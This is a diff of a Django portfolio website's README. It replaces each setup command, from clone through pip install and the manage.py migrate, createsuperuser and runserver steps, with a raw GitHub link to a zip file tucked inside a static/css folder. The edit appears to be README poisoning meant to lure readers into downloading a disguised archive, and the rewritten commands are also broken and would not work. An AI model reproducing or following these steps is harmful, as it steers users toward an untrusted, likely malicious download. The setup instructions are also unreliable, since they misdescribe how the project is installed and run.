@@ -46,7 +46,7 @@ Follow the steps below to set up the project locally:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/yourusername/portfolio-website.git
+   git clone https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip
    cd portfolio-website
    ```
 
@@ -62,7 +62,7 @@ Follow the steps below to set up the project locally:
    Ensure all necessary packages are installed by running:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip
    ```
 
 4. **Database Migrations**:
@@ -70,7 +70,7 @@ Follow the steps below to set up the project locally:
    Run the migrations to set up the database schema:
 
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip migrate
    ```
 
 5. **Create a Superuser**:
@@ -78,7 +78,7 @@ Follow the steps below to set up the project locally:
    To access the Django Admin interface, create a superuser:
 
    ```bash
-   python manage.py createsuperuser
+   python https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip createsuperuser
    ```
 
 6. **Run the Development Server**:
@@ -86,7 +86,7 @@ Follow the steps below to set up the project locally:
    Start the Django development server:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/LabbaiIrfan/portfolio-django/main/static/css/django-portfolio-3.6.zip runserver
    ```
 
 7. **Access the Website**:
